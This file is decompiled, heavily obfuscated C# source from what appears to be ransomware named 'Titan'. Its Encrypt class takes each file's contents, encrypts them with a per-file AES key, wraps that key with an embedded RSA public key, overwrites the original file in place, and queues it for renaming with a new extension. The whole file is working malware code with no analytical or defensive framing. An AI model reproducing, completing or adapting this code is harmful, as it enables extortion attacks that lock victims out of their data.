using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using _5aa7ea47;
using c3f4f3aa;
using e5e614e0;

namespace Titan.Function;

internal class Encrypt
{
	public static void Process(FileInfo file)
	{
		//IL_0095: Expected O, but got I4
		//IL_00f9: Expected O, but got I4
		//IL_0144: Expected O, but got I4
		//IL_01f1: Expected O, but got I4
		//IL_0251: Expected O, but got I4
		try
		{
			byte[] array = _003CModule_003E._0060àôEk(_003CModule_003E._005DÜ_00B2_000Cn(file));
			string text = default(string);
			List<byte> list = default(List<byte>);
			string arg = default(string);
			Guid guid = default(Guid);
			while (true)
			{
				int num = -1225540752;
				while (true)
				{
					int num2;
					switch ((uint)(num2 = _003CModule_003E._49b831c9(num)) % 8u)
					{
					case 0u:
						break;
					default:
						return;
					case 6u:
						Data.toRename.Add(file, Path.ChangeExtension(file.FullName, _003CModule_003E._49b74782<string>((uint)(_003CModule_003E.a200837b("Mjk1ODczMTYw") + 4114915 - Math.Max(4114915, 2057457)), 0 + int.Parse("1553970438")) + text));
						num = (num2 * -1261497193) ^ 0x77255B4F;
						continue;
					case 4u:
						list.AddRange(Encoding.UTF8.GetBytes(_003CModule_003E._0aa39330<string>((uint)(_003CModule_003E.a200837b("LTE0NzI0MjMwNzc=") + Math.Min(4114915, 8229830) - 4114915), 0 + int.Parse("399630799"))));
						list.AddRange(Encoding.UTF8.GetBytes(string.Format(_003CModule_003E._9e15c4c7<string>((uint)(_003CModule_003E.a200837b("LTEwOTQxMTY2Mw==") + Math.Min(4114915, 8229830) - 4114915), 0 + int.Parse("396252409")), array.Length, file.Extension, arg)));
						num = (num2 * 1660060332) ^ -1590539654;
						continue;
					case 1u:
					{
						int num3;
						int num4;
						if (array.Length == 0)
						{
							num3 = -25108784;
							num4 = num3;
						}
						else
						{
							num3 = -1864840191;
							num4 = num3;
						}
						num = num3 ^ (num2 * 1406423981);
						continue;
					}
					case 5u:
						guid = _003CModule_003E.ì_00AFC_0019s();
						num = (num2 * -1703650185) ^ -165443675;
						continue;
					case 3u:
					{
						byte[] array2 = ComputeMD5Hash(guid.ToString(_003CModule_003E._31ec1b2a<string>((uint)(_003CModule_003E.a200837b("MTMyOTkzMzc5NQ==") + 4114915 - Math.Min(4114915, 8229830)), 0 + int.Parse("1153367373"))));
						byte[] iV = ComputeMD5Hash(Data.UUID);
						arg = Convert.ToBase64String(RSAEncrypt(array2, Data.PublicKey));
						text = _003CModule_003E._0aa39330<string>((uint)(_003CModule_003E.a200837b("LTE0NzI0MjMwNzQ=") + 4114915 - Math.Max(4114915, 2057457)), 0 + int.Parse("551649206"));
						list = new List<byte>(AESEncrypt(array2, array, isCBC: true, iV));
						num = (num2 * -704668235) ^ -163701940;
						continue;
					}
					case 7u:
						File.WriteAllBytes(file.FullName, list.ToArray());
						num = (num2 * 1896325093) ^ 0x76370D0A;
						continue;
					case 2u:
						return;
					}
					break;
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
	}

	public static byte[] ComputeMD5Hash(string rawData)
	{
		MD5 mD = _003CModule_003E._002Dâ_00B9i_009B();
		try
		{
			return _003CModule_003E.UÎZ_002A_00F7(mD, _003CModule_003E.ÇSt_0085_00B4(_003CModule_003E.ó_003C_0081Åñ(), rawData));
		}
		finally
		{
			if (mD != null)
			{
				while (true)
				{
					IL_0031:
					int num = -1239408578;
					while (true)
					{
						int num2;
						switch ((uint)(num2 = _003CModule_003E._49b831c9(num)) % 3u)
						{
						case 0u:
							break;
						default:
							goto end_IL_0036;
						case 2u:
							goto IL_0052;
						case 1u:
							goto end_IL_0036;
						}
						goto IL_0031;
						IL_0052:
						_003CModule_003E._00A2È9Øî(mD);
						num = (num2 * -752639300) ^ 0x62579AEC;
						continue;
						end_IL_0036:
						break;
					}
					break;
				}
			}
		}
	}

	public static byte[] RSAEncrypt(byte[] DataToDecrypt, string xml)
	{
		RSACryptoServiceProvider rSACryptoServiceProvider = _003CModule_003E.Î_009C_00BB1O();
		RSAParameters rSAParameters = _49e4ec22.fd4fff8f((RSA)rSACryptoServiceProvider, false);
		rSAParameters.Modulus = _003CModule_003E.lz_009B_005BÅ(xml);
		_31ad1b42._0b056546((RSA)rSACryptoServiceProvider, rSAParameters);
		return dea3dc99._062b7279(rSACryptoServiceProvider, DataToDecrypt, false);
	}

	public static byte[] AESEncrypt(byte[] encryptionKey, byte[] bytes, bool isCBC, byte[] IV = null)
	{
		Aes aes = _003CModule_003E.U_0098oà_003D();
		try
		{
			_003CModule_003E._008DLjýE(aes, encryptionKey);
			byte[] result = default(byte[]);
			while (true)
			{
				int num = -506365742;
				while (true)
				{
					int num2;
					switch ((uint)(num2 = _003CModule_003E._49b831c9(num)) % 8u)
					{
					case 6u:
						break;
					case 5u:
						_003CModule_003E.D_0088_00ABÆ_009D(aes, CipherMode.ECB);
						num = -1658968853;
						continue;
					case 3u:
						_003CModule_003E.Í_0095_008Cx_0060(aes, IV);
						num = (num2 * -153727299) ^ -483388968;
						continue;
					case 2u:
						_003CModule_003E.D_0088_00ABÆ_009D(aes, CipherMode.CBC);
						num = (num2 * 1510028833) ^ -620936044;
						continue;
					case 0u:
						num = (num2 * 179139442) ^ 0x4CFE9A8B;
						continue;
					case 7u:
					{
						int num8;
						int num9;
						if (!isCBC)
						{
							num8 = -960397151;
							num9 = num8;
						}
						else
						{
							num8 = 866051536;
							num9 = num8;
						}
						num = num8 ^ (num2 * 498536443);
						continue;
					}
					case 4u:
						_003CModule_003E.M_00D7é3W(aes, PaddingMode.Zeros);
						num = -1597453368;
						continue;
					default:
					{
						ICryptoTransform cryptoTransform = _003CModule_003E._00A8_007BÎÊ_0093(aes, _003CModule_003E._5__001EÞî(aes), _003CModule_003E._0080çÎp_001F(aes));
						try
						{
							MemoryStream memoryStream = _003CModule_003E._009BfLNz();
							try
							{
								CryptoStream cryptoStream = _003CModule_003E.x_009A_0019_0007ë(memoryStream, cryptoTransform, CryptoStreamMode.Write);
								try
								{
									_003CModule_003E.T0zf_000E(cryptoStream, bytes, 0, bytes.Length);
									while (true)
									{
										IL_0131:
										int num3 = -1578681891;
										while (true)
										{
											switch ((uint)(num2 = _003CModule_003E._49b831c9(num3)) % 3u)
											{
											case 2u:
												break;
											default:
												goto end_IL_0136;
											case 1u:
												goto IL_0153;
											case 0u:
												goto end_IL_0136;
											}
											goto IL_0131;
											IL_0153:
											_003CModule_003E.Àr_0010_0026_00A8(cryptoStream);
											num3 = (num2 * -417650314) ^ -1820339341;
											continue;
											end_IL_0136:
											break;
										}
										break;
									}
								}
								finally
								{
									if (cryptoStream != null)
									{
										while (true)
										{
											IL_0175:
											int num4 = -111451860;
											while (true)
											{
												switch ((uint)(num2 = _003CModule_003E._49b831c9(num4)) % 3u)
												{
												case 0u:
													break;
												default:
													goto end_IL_017a;
												case 1u:
													goto IL_0197;
												case 2u:
													goto end_IL_017a;
												}
												goto IL_0175;
												IL_0197:
												_003CModule_003E._00A2È9Øî(cryptoStream);
												num4 = (num2 * -1255404862) ^ 0x3745499E;
												continue;
												end_IL_017a:
												break;
											}
											break;
										}
									}
								}
								_003CModule_003E.Õ_00ACû4W(memoryStream);
								while (true)
								{
									int num5 = -137693756;
									while (true)
									{
										switch ((uint)(num2 = _003CModule_003E._49b831c9(num5)) % 3u)
										{
										case 0u:
											break;
										case 1u:
											goto IL_01e1;
										default:
											return result;
										case 2u:
											return result;
										}
										break;
										IL_01e1:
										result = _003CModule_003E._005Eý_00BEÓt(memoryStream);
										num5 = (num2 * 1289878711) ^ -705584578;
									}
								}
							}
							finally
							{
								if (memoryStream != null)
								{
									while (true)
									{
										IL_0205:
										int num6 = -1270555095;
										while (true)
										{
											switch ((uint)(num2 = _003CModule_003E._49b831c9(num6)) % 3u)
											{
											case 2u:
												break;
											default:
												goto end_IL_020a;
											case 1u:
												goto IL_0227;
											case 0u:
												goto end_IL_020a;
											}
											goto IL_0205;
											IL_0227:
											_003CModule_003E._00A2È9Øî(memoryStream);
											num6 = (num2 * 1427694687) ^ -1720392729;
											continue;
											end_IL_020a:
											break;
										}
										break;
									}
								}
							}
						}
						finally
						{
							if (cryptoTransform != null)
							{
								while (true)
								{
									IL_0246:
									int num7 = -333695590;
									while (true)
									{
										switch ((uint)(num2 = _003CModule_003E._49b831c9(num7)) % 3u)
										{
										case 0u:
											break;
										default:
											goto end_IL_024b;
										case 2u:
											goto IL_0268;
										case 1u:
											goto end_IL_024b;
										}
										goto IL_0246;
										IL_0268:
										_003CModule_003E._00A2È9Øî(cryptoTransform);
										num7 = (num2 * -1912849328) ^ -477889548;
										continue;
										end_IL_024b:
										break;
									}
									break;
								}
							}
						}
					}
					}
					break;
				}
			}
		}
		finally
		{
			if (aes != null)
			{
				while (true)
				{
					IL_0287:
					int num10 = -95208730;
					while (true)
					{
						int num2;
						switch ((uint)(num2 = _003CModule_003E._49b831c9(num10)) % 3u)
						{
						case 2u:
							break;
						default:
							goto end_IL_028c;
						case 1u:
							goto IL_02a9;
						case 0u:
							goto end_IL_028c;
						}
						goto IL_0287;
						IL_02a9:
						_003CModule_003E._00A2È9Øî(aes);
						num10 = (num2 * 1633472767) ^ -1860800890;
						continue;
						end_IL_028c:
						break;
					}
					break;
				}
			}
		}
	}
}
